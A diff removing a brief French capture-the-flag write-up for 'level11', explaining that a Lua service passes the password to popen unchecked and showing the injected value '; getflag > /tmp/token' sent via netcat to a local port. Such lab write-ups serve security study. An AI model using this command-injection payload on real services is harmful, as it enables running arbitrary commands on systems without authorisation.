@@ -1,7 +1,0 @@
-On affiche level11.lua et on voit directement que le programme fait un popen sans verifier le parametre du password demandé lors de la connexion
-
-on fait un 'nc 127.0.0.1 5151'
-
-Ensuite on fait '; getflag > /tmp/token'
-
-cat /tmp/token 
